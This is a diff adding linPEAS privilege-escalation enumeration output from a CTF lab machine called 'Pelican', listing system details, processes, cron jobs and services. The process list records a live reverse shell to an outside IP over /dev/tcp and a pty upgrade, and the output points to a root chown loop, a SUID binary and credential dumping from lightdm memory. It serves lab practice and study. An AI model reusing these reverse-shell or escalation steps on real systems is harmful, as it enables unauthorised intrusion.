@@ -1,0 +1,2632 @@
+root@kali:~/CTF/PGPractice/Pelican/PE# cat linpeas.txt
+
+
+                     ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+             ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄▄
+      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄
+  ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄
+  ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
+  ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄
+  ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
+  ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
+  ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
+  ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
+  ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
+  ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
+  ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
+  ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄
+   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+   ▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄
+        ▄▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄
+             ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+    linpeas v3.2.4 by carlospolop
+
+ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.
+
+Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
+ LEGEND:
+  RED/YELLOW: 95% a PE vector
+  RED: You should take a look to it
+  LightCyan: Users with console
+  Blue: Users without console & mounted devs
+  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs)
+  LightMagenta: Your username
+
+ Starting linpeas. Caching Writable Folders...
+
+════════════════════════════════════╣ Basic information ╠════════════════════════════════════
+OS: Linux version 4.19.0-10-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.132-1 (2020-07-24)
+User & Groups: uid=1000(charles) gid=1000(charles) groups=1000(charles)
+Hostname: pelican
+Writable folder: /dev/shm
+[+] /usr/bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
+[+] /usr/bin/nc is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)
+
+
+Caching directories DONE
+
+════════════════════════════════════╣ System Information ╠════════════════════════════════════
+╔══════════╣ Operative system
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits
+Linux version 4.19.0-10-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.132-1 (2020-07-24)
+Distributor ID: Debian
+Description:    Debian GNU/Linux 10 (buster)
+Release:        10
+Codename:       buster
+
+╔══════════╣ Sudo version
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version
+Sudo version 1.8.27
+
+╔══════════╣ USBCreator
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation
+
+╔══════════╣ PATH
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+╔══════════╣ Date
+Fri 18 Jun 2021 11:45:48 AM EDT
+
+╔══════════╣ System stats
+Filesystem      Size  Used Avail Use% Mounted on
+udev            978M     0  978M   0% /dev
+tmpfs           200M  9.9M  190M   5% /run
+/dev/sda1        18G  4.1G   13G  25% /
+tmpfs           998M     0  998M   0% /dev/shm
+tmpfs           5.0M     0  5.0M   0% /run/lock
+tmpfs           998M     0  998M   0% /sys/fs/cgroup
+tmpfs           200M  4.0K  200M   1% /run/user/112
+              total        used        free      shared  buff/cache   available
+Mem:        2042156      328960     1247112       11980      466084     1534772
+Swap:       2094076           0     2094076
+
+╔══════════╣ CPU info
+Architecture:        x86_64
+CPU op-mode(s):      32-bit, 64-bit
+Byte Order:          Little Endian
+Address sizes:       43 bits physical, 48 bits virtual
+CPU(s):              1
+On-line CPU(s) list: 0
+Thread(s) per core:  1
+Core(s) per socket:  1
+Socket(s):           1
+NUMA node(s):        1
+Vendor ID:           AuthenticAMD
+CPU family:          23
+Model:               1
+Model name:          AMD EPYC 7371 16-Core Processor
+Stepping:            2
+CPU MHz:             3094.187
+BogoMIPS:            6188.37
+Hypervisor vendor:   VMware
+Virtualization type: full
+L1d cache:           32K
+L1i cache:           64K
+L2 cache:            512K
+L3 cache:            65536K
+NUMA node0 CPU(s):   0
+Flags:               fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx mmxext fxsr_opt pdpe1gb rdtscp lm constant_tsc rep_good nopl tsc_reliable nonstop_tsc cpuid extd_apicid pni pclmulqdq ssse3 fma cx16 sse4_1 sse4_2 x2apic movbe popcnt aes xsave avx f16c rdrand hypervisor lahf_lm extapic cr8_legacy abm sse4a misalignsse 3dnowprefetch osvw ssbd ibpb vmmcall fsgsbase bmi1 avx2 smep bmi2 rdseed adx smap clflushopt sha_ni xsaveopt xsavec xsaves clzero arat overflow_recov succor
+
+╔══════════╣ Environment
+╚ Any private information inside environment variables?
+HISTFILESIZE=0
+USER=charles
+SHLVL=3
+HOME=/home/charles
+OLDPWD=/home/charles
+PS1=\[\e]0;\u@\h: \w\a\]\[\033[01;32m\]\u@\h\[\033[01;34m\] \w\$\[\033[00m\]
+LOGNAME=charles
+JOURNAL_STREAM=9:16250
+_=./linpeas.sh
+TERM=xterm
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+INVOCATION_ID=994484f1718c4329aaf69e636370a918
+LANG=en_US.UTF-8
+HISTSIZE=0
+LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
+SHELL=bash
+PWD=/home/charles/tmp
+HISTFILE=/dev/null
+LS_OPTIONS=--color=auto
+
+╔══════════╣ Searching Signature verification failed in dmseg
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#dmesg-signature-verification-failed
+ Not Found
+
+╔══════════╣ Linux Protections
+═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.
+apparmor module is loaded.
+═╣ grsecurity present? ............ grsecurity Not Found
+═╣ PaX bins present? .............. PaX Not Found
+═╣ Execshield enabled? ............ Execshield Not Found
+═╣ SELinux enabled? ............... sestatus Not Found
+═╣ Is ASLR enabled? ............... Yes
+═╣ Printer? ....................... lpstat Not Found
+═╣ Is this a virtual machine? ..... Yes (vmware)
+
+════════════════════════════════════╣ Containers ╠════════════════════════════════════
+╔══════════╣ Container related tools present
+╔══════════╣ Container details
+═╣ Is this a container? ........... No
+═╣ Any running containers? ........ No
+
+════════════════════════════════════╣ Devices ╠════════════════════════════════════
+╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
+disk
+sda
+sda1
+sda2
+sda5
+
+╔══════════╣ Unmounted file-system?
+╚ Check if you can mount umounted devices
+UUID=3d6bb9ca-e81c-47fe-b2c3-f6d706ee13bb /               ext4    errors=remount-ro 0       1
+UUID=f24d8a56-9755-4a96-ad62-1d989efed3b5 none            swap    sw              0       0
+/dev/sr0        /media/cdrom0   udf,iso9660 user,noauto     0       0
+
+
+════════════════════════════════════╣ Available Software ╠════════════════════════════════════
+╔══════════╣ Useful software
+/usr/bin/nc
+/usr/bin/netcat
+/usr/bin/nc.traditional
+/usr/bin/wget
+/usr/bin/ping
+/usr/bin/gdb
+/usr/bin/base64
+/usr/bin/python
+/usr/bin/python2
+/usr/bin/python3
+/usr/bin/python2.7
+/usr/bin/python3.7
+/usr/bin/perl
+/usr/bin/xterm
+/usr/bin/sudo
+
+╔══════════╣ Installed Compiler
+
+
+════════════════════════════════════╣ Processes, Cron, Services, Timers & Sockets ╠════════════════════════════════════
+╔══════════╣ Cleaned processes
+╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
+root         1  0.0  0.5 169516 10228 ?        Ss   10:05   0:00 /sbin/init
+root       258  0.0  0.4  43100  8360 ?        Ss   10:05   0:00 /lib/systemd/systemd-journald
+root       280  0.0  0.2  22476  5112 ?        Ss   10:05   0:00 /lib/systemd/systemd-udevd
+root       314  0.0  0.5  48220 11036 ?        Ss   10:05   0:00 /usr/bin/VGAuthService
+systemd+   315  0.0  0.4  95148  8592 ?        Ssl  10:05   0:00 /lib/systemd/systemd-timesyncd
+  └─(Caps) 0x0000000002000000=cap_sys_time
+root       323  0.0  0.6 123176 12456 ?        Ssl  10:05   0:03 /usr/bin/vmtoolsd
+message+   439  0.0  0.2   9696  4848 ?        Ss   10:05   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+  └─(Caps) 0x0000000020000000=cap_audit_write
+root       442  0.0  0.2 225824  4360 ?        Ssl  10:05   0:00 /usr/sbin/rsyslogd -n -iNONE
+root       443  0.0  0.4 318332 10100 ?        Ssl  10:05   0:00 /usr/sbin/ModemManager --filter-policy=strict
+root       444  0.0  0.3  19532  7356 ?        Ss   10:05   0:00 /lib/systemd/systemd-logind
+root       452  0.0  0.2  19768  5292 ?        Ss   10:05   0:00 /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant
+root       460  0.0  0.6 398428 13752 ?        Ssl  10:05   0:00 /usr/lib/udisks2/udisksd
+root       461  0.0  0.7 406400 15888 ?        Ssl  10:05   0:00 /usr/sbin/NetworkManager --no-daemon[0m
+avahi      484  0.0  0.0   8156   324 ?        S    10:05   0:00  _ avahi-daemon: chroot helper
+root       470  0.0  0.1   8504  2852 ?        Ss   10:05   0:00 /usr/sbin/cron -f
+root       475  0.0  0.1   9468  2468 ?        S    10:05   0:00  _ /usr/sbin/CRON -f
+root       489  0.0  0.0   2388  1596 ?        Ss   10:05   0:01      _ /bin/sh -c while true; do chown -R charles:charles /opt/zookeeper && chown -R charles:charles /opt/exhibitor && sleep 1; done
+root     27884  0.0  0.0   5260   684 ?        S    11:45   0:00          _ sleep 1
+root       485  0.0  0.5 185104 11160 ?        Ssl  10:05   0:00 /usr/sbin/cups-browsed
+root       488  0.0  0.3 235840  6788 ?        Ssl  10:05   0:00 /usr/lib/policykit-1/polkitd --no-debug
+root       493  0.0  0.0   2276    72 ?        Ss   10:05   0:00 /usr/bin/password-store
+charles    504  0.2  6.3 2578468 130116 ?      Ssl  10:05   0:14 /usr/bin/java -jar /opt/exhibitor/exhibitor-1.0-jar-with-dependencies.jar -c file
+root       526  0.0  0.3  15852  7120 ?        Ss   10:05   0:00 /usr/sbin/sshd -D
+root       532  0.0  0.3 313364  6960 ?        Ssl  10:05   0:00 /usr/sbin/lightdm
+root       560  0.0  2.2 224980 45720 tty7     Ssl+ 10:05   0:00  _ /usr/lib/xorg/Xorg :0 -seat seat0 -auth /var/run/lightdm/root/:0 -nolisten tcp vt7 -novtswitch
+root       653  0.0  0.4 166784  9248 ?        Sl   10:05   0:00  _ lightdm --session-child 18 21
+lightdm    672  0.0  3.5 504860 72192 ?        Ssl  10:05   0:01  |   _ /usr/sbin/lightdm-gtk-greeter
+root       721  0.0  0.2  18748  5276 ?        S    10:05   0:00  _ lightdm --session-child 14 21
+root       556  0.0  0.0  69740  1940 ?        Ss   10:05   0:00 nginx: master process /usr/sbin/nginx -g daemon[0m on; master_process on;
+www-data   558  0.0  0.2  70408  5784 ?        S    10:05   0:00  _ nginx: worker process
+root       559  0.0  0.0   5612  1660 tty1     Ss+  10:05   0:00 /sbin/agetty -o -p -- u --noclear tty1 linux
+root       642  0.0  0.4 105112  9700 ?        Ssl  10:05   0:00 /usr/sbin/cupsd -l
+lightdm    657  0.0  0.4  21268  9376 ?        Ss   10:05   0:00 /lib/systemd/systemd --user
+lightdm    658  0.0  0.1  23352  2488 ?        S    10:05   0:00  _ (sd-pam)
+lightdm    681  0.0  0.2   8960  4316 ?        Ss   10:05   0:00  _ /usr/bin/dbus-daemon --session --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+lightdm    682  0.0  0.4 312452  8356 ?        Ssl  10:05   0:00  _ /usr/lib/at-spi2-core/at-spi-bus-launcher
+lightdm    687  0.0  0.1   8840  3660 ?        S    10:05   0:00  |   _ /usr/bin/dbus-daemon --config-file=/usr/share/defaults/at-spi2/accessibility.conf --nofork --print-address 3
+lightdm    690  0.0  0.3 174008  6644 ?        Sl   10:05   0:00  _ /usr/lib/at-spi2-core/at-spi2-registryd --use-gnome-session
+lightdm    691  0.0  0.3 239980  6952 ?        Ssl  10:05   0:00  _ /usr/lib/gvfs/gvfsd
+root      1318  0.0  1.0  50152 21244 ?        Ss   10:07   0:00 /usr/sbin/smbd --foreground --no-process-group
+root      1320  0.0  0.2  46672  5904 ?        S    10:07   0:00  _ /usr/sbin/smbd --foreground --no-process-group
+root      1321  0.0  0.2  46680  5936 ?        S    10:07   0:00  _ /usr/sbin/smbd --foreground --no-process-group
+root      1323  0.0  0.3  50136  7108 ?        S    10:07   0:00  _ /usr/sbin/smbd --foreground --no-process-group
+charles  24475  0.0  0.1   6644  2940 ?        S    11:36   0:00 bash /tmp/shell.sh
+charles  24478  0.0  0.1   6644  3152 ?        S    11:36   0:00  _ bash -c bash -i >& /dev/tcp/192.168.49.248/8081 0>&1
+charles  24479  0.0  0.2   7632  4492 ?        S    11:36   0:00      _ bash -i
+charles  24764  0.0  0.4  16968  8568 ?        S    11:37   0:00          _ python3 -c import pty; pty.spawn("/bin/bash")
+charles  24765  0.0  0.2   8324  5016 pts/0    Ss   11:37   0:00              _ /bin/bash
+charles  26910  0.1  0.1   3156  2344 pts/0    S+   11:45   0:00                  _ /bin/sh ./linpeas.sh -a
+charles  27994  0.0  0.0   3156   840 pts/0    S+   11:45   0:00                  |   _ /bin/sh ./linpeas.sh -a
+charles  27998  0.0  0.1  10784  3148 pts/0    R+   11:45   0:00                  |   |   _ ps fauxwww
+charles  27997  0.0  0.0   3156   840 pts/0    S+   11:45   0:00                  |   _ /bin/sh ./linpeas.sh -a
+charles  26911  0.0  0.0   5264   740 pts/0    S+   11:45   0:00                  _ tee linpeas.txt
+charles  24514  0.4  3.3 2546888 67460 ?       Sl   11:36   0:02 java -Dzookeeper.log.dir=. -Dzookeeper.root.logger=INFO,CONSOLE -cp /opt/zookeeper/bin/../build/classes:/opt/zookeeper/bin/../build/lib/*.jar:/opt/zookeeper/bin/../lib/slf4j-log4j12-1.6.1.jar:/opt/zookeeper/bin/../lib/slf4j-api-1.6.1.jar:/opt/zookeeper/bin/../lib/netty-3.7.0.Final.jar:/opt/zookeeper/bin/../lib/log4j-1.2.16.jar:/opt/zookeeper/bin/../lib/jline-0.9.94.jar:/opt/zookeeper/bin/../zookeeper-3.4.6.jar:/opt/zookeeper/bin/../src/java/lib/*.jar:/opt/zookeeper/bin/../conf: -Dcom.sun.management.jmxremote -Dcom.sun.management.jmxremote.local.only=false org.apache.zookeeper.server.quorum.QuorumPeerMain /opt/zookeeper/bin/../conf/zoo.cfg
+
+╔══════════╣ Binary processes permissions
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
+-rwxr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
+lrwxrwxrwx 1 root root       4 Sep  9  2020 /bin/sh -> dash
+-rwxr-xr-x 1 root root 1489208 Apr 27  2020 /lib/systemd/systemd
+-rwxr-xr-x 1 root root  145488 Apr 27  2020 /lib/systemd/systemd-journald
+-rwxr-xr-x 1 root root  231560 Apr 27  2020 /lib/systemd/systemd-logind
+-rwxr-xr-x 1 root root   55360 Apr 27  2020 /lib/systemd/systemd-timesyncd
+-rwxr-xr-x 1 root root  678392 Apr 27  2020 /lib/systemd/systemd-udevd
+-rwxr-xr-x 1 root root   64744 Jan 10  2019 /sbin/agetty
+lrwxrwxrwx 1 root root      20 Apr 27  2020 /sbin/init -> /lib/systemd/systemd
+-rwxr-xr-x 1 root root 2851888 Mar 24  2020 /sbin/wpa_supplicant
+-rwxr-xr-x 1 root root  240680 Jul  5  2020 /usr/bin/dbus-daemon[0m
+lrwxrwxrwx 1 root root      22 Sep  9  2020 /usr/bin/java -> /etc/alternatives/java
+-rws--x--x 1 root root   17024 Sep 10  2020 /usr/bin/password-store
+-rwxr-xr-x 1 root root  131360 Oct  9  2019 /usr/bin/VGAuthService
+-rwxr-xr-x 1 root root   56808 Oct  9  2019 /usr/bin/vmtoolsd
+-rwxr-xr-x 1 root root   95816 Feb  9  2019 /usr/lib/at-spi2-core/at-spi2-registryd
+-rwxr-xr-x 1 root root   26696 Feb  9  2019 /usr/lib/at-spi2-core/at-spi-bus-launcher
+-rwxr-xr-x 1 root root   34808 Jun 11  2019 /usr/lib/gvfs/gvfsd
+-rwxr-xr-x 1 root root   19080 Jan 15  2019 /usr/lib/policykit-1/polkitd
+-rwxr-xr-x 1 root root  462392 Feb 21  2019 /usr/lib/udisks2/udisksd
+-rwxr-xr-x 1 root root 2427776 Aug 27  2020 /usr/lib/xorg/Xorg
+-rwxr-xr-x 1 root root   55792 Oct 11  2019 /usr/sbin/cron
+-rwxr-xr-x 1 root root  186784 Apr 10  2019 /usr/sbin/cups-browsed
+-rwxr-xr-x 1 root root  457288 Apr 25  2020 /usr/sbin/cupsd
+-rwxr-xr-x 1 root root  280656 Feb 22  2019 /usr/sbin/lightdm
+-rwxr-xr-x 1 root root  145624 Dec 27  2018 /usr/sbin/lightdm-gtk-greeter
+-rwxr-xr-x 1 root root 1443432 Feb  5  2019 /usr/sbin/ModemManager
+-rwxr-xr-x 1 root root 2574104 Oct  4  2019 /usr/sbin/NetworkManager
+-rwxr-xr-x 1 root root  702096 Feb 26  2019 /usr/sbin/rsyslogd
+-rwxr-xr-x 1 root root   92256 Sep  2  2019 /usr/sbin/smbd
+-rwxr-xr-x 1 root root  807336 Jan 31  2020 /usr/sbin/sshd
+
+╔══════════╣ Files opened by processes belonging to other users
+╚ This is usually empty because of the lack of privileges to read other user processes information
+COMMAND     PID   TID TASKCMD               USER   FD      TYPE             DEVICE  SIZE/OFF    NODE NAME
+
+╔══════════╣ Processes with credentials in memory (root req)
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#credentials-from-process-memory
+gdm-password Not Found
+gnome-keyring-daemon Not Found
+lightdm process found (dump creds from memory as root)
+vsftpd Not Found
+apache2 Not Found
+sshd Not Found
+
+╔══════════╣ Different processes executed during 1 min (interesting is low number of repetitions)
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#frequent-cron-jobs
+      8 chown -R charles:charles /opt/zookeeper
+
+╔══════════╣ Cron jobs
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-cron-jobs
+/usr/bin/crontab
+incrontab Not Found
+-rw-r--r-- 1 root root 1209 Sep 10  2020 /etc/crontab
+
+/etc/cron.d:
+total 16
+drwxr-xr-x   2 root root 4096 Sep  9  2020 .
+drwxr-xr-x 120 root root 4096 Jun 18 10:07 ..
+-rw-r--r--   1 root root  285 May 19  2019 anacron
+-rw-r--r--   1 root root  102 Oct 11  2019 .placeholder
+
+/etc/cron.daily:
+total 44
+drwxr-xr-x   2 root root 4096 Sep 10  2020 .
+drwxr-xr-x 120 root root 4096 Jun 18 10:07 ..
+-rwxr-xr-x   1 root root  311 May 19  2019 0anacron
+-rwxr-xr-x   1 root root 1478 May 28  2019 apt-compat
+-rwxr-xr-x   1 root root  355 Dec 29  2017 bsdmainutils
+-rwxr-xr-x   1 root root 1187 Apr 18  2019 dpkg
+-rwxr-xr-x   1 root root  377 Aug 28  2018 logrotate
+-rwxr-xr-x   1 root root 1123 Feb 10  2019 man-db
+-rwxr-xr-x   1 root root  249 Sep 27  2017 passwd
+-rw-r--r--   1 root root  102 Oct 11  2019 .placeholder
+-rwxr-xr-x   1 root root  383 Sep  2  2019 samba
+
+/etc/cron.hourly:
+total 12
+drwxr-xr-x   2 root root 4096 Sep  9  2020 .
+drwxr-xr-x 120 root root 4096 Jun 18 10:07 ..
+-rw-r--r--   1 root root  102 Oct 11  2019 .placeholder
+
+/etc/cron.monthly:
+total 16
+drwxr-xr-x   2 root root 4096 Sep  9  2020 .
+drwxr-xr-x 120 root root 4096 Jun 18 10:07 ..
+-rwxr-xr-x   1 root root  313 May 19  2019 0anacron
+-rw-r--r--   1 root root  102 Oct 11  2019 .placeholder
+
+/etc/cron.weekly:
+total 20
+drwxr-xr-x   2 root root 4096 Sep  9  2020 .
+drwxr-xr-x 120 root root 4096 Jun 18 10:07 ..
+-rwxr-xr-x   1 root root  312 May 19  2019 0anacron
+-rwxr-xr-x   1 root root  813 Feb 10  2019 man-db
+-rw-r--r--   1 root root  102 Oct 11  2019 .placeholder
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+@reboot         root    /usr/bin/password-store
+@reboot         root    while true; do chown -R charles:charles /opt/zookeeper && chown -R charles:charles /opt/exhibitor && sleep 1; done
+
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+HOME=/root
+LOGNAME=root
+
+1       5       cron.daily      run-parts --report /etc/cron.daily
+7       10      cron.weekly     run-parts --report /etc/cron.weekly
+@monthly        15      cron.monthly    run-parts --report /etc/cron.monthly
+
+╔══════════╣ Services
+╚ Search for outdated versions
+ [ + ]  alsa-utils
+ [ - ]  anacron
+ [ + ]  apparmor
+ [ + ]  avahi-daemon
+ [ - ]  console-setup.sh
+ [ + ]  cron
+ [ + ]  cups
+ [ + ]  cups-browsed
+ [ + ]  dbus
+ [ + ]  hddtemp
+ [ - ]  hwclock.sh
+ [ - ]  keyboard-setup.sh
+ [ + ]  kmod
+ [ + ]  lightdm
+ [ + ]  lm-sensors
+ [ + ]  network-manager
+ [ + ]  networking
+ [ + ]  nginx
+ [ - ]  nmbd
+ [ + ]  open-vm-tools
+ [ - ]  plymouth
+ [ - ]  plymouth-log
+ [ - ]  pppd-dns
+ [ + ]  procps
+ [ + ]  rsyslog
+ [ - ]  samba-ad-dc
+ [ - ]  saned
+ [ + ]  smbd
+ [ - ]  speech-dispatcher
+ [ + ]  ssh
+ [ - ]  sudo
+ [ + ]  udev
+ [ - ]  x11-common
+
+╔══════════╣ Systemd PATH
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#systemd-path-relative-paths
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+╔══════════╣ Analyzing .service files
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#services
+/etc/systemd/system/default.target.wants/exhibitor.service is executing some relative path
+/etc/systemd/system/exhibitor.service is executing some relative path
+You can't write on systemd PATH
+
+╔══════════╣ System timers
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers
+NEXT                         LEFT       LAST                         PASSED       UNIT                         ACTIVATES
+Fri 2021-06-18 12:34:56 EDT  47min left Fri 2021-06-18 11:33:34 EDT  13min ago    anacron.timer                anacron.service
+Sat 2021-06-19 00:00:00 EDT  12h left   Fri 2021-06-18 10:07:49 EDT  1h 39min ago logrotate.timer              logrotate.service
+Sat 2021-06-19 00:00:00 EDT  12h left   Fri 2021-06-18 10:07:49 EDT  1h 39min ago man-db.timer                 man-db.service
+Sat 2021-06-19 00:26:01 EDT  12h left   Fri 2021-06-18 10:07:49 EDT  1h 39min ago apt-daily.timer              apt-daily.service
+Sat 2021-06-19 06:34:03 EDT  18h left   Fri 2021-06-18 10:07:49 EDT  1h 39min ago apt-daily-upgrade.timer      apt-daily-upgrade.service
+Sat 2021-06-19 10:20:29 EDT  22h left   Fri 2021-06-18 10:20:29 EDT  1h 26min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
+
+╔══════════╣ Analyzing .timer files
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers
+
+╔══════════╣ Analyzing .socket files
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets
+
+╔══════════╣ HTTP sockets
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets
+
+╔══════════╣ D-Bus config files
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus
+Possible weak user policy found on /etc/dbus-1/system.d/avahi-dbus.conf (  <policy user="avahi">)
+Possible weak user policy found on /etc/dbus-1/system.d/avahi-dbus.conf (  <policy group="netdev">)
+Possible weak user policy found on /etc/dbus-1/system.d/dnsmasq.conf (        <policy user="dnsmasq">)
+Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.RealtimeKit1.conf (  <policy user="rtkit">)
+Possible weak user policy found on /etc/dbus-1/system.d/pulseaudio-system.conf (  <policy user="pulse">)
+Possible weak user policy found on /etc/dbus-1/system.d/wpa_supplicant.conf (        <policy group="netdev">)
+
+╔══════════╣ D-Bus Service Objects list
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus
+NAME                                       PID PROCESS         USER             CONNECTION    UNIT                      SESSION    DESCRIPTION
+:1.0                                       315 systemd-timesyn systemd-timesync :1.0          systemd-timesyncd.service -          -
+:1.11                                      488 polkitd         root             :1.11         polkit.service            -          -
+:1.14                                      461 NetworkManager  root             :1.14         NetworkManager.service    -          -
+:1.15                                      485 cups-browsed    root             :1.15         cups-browsed.service      -          -
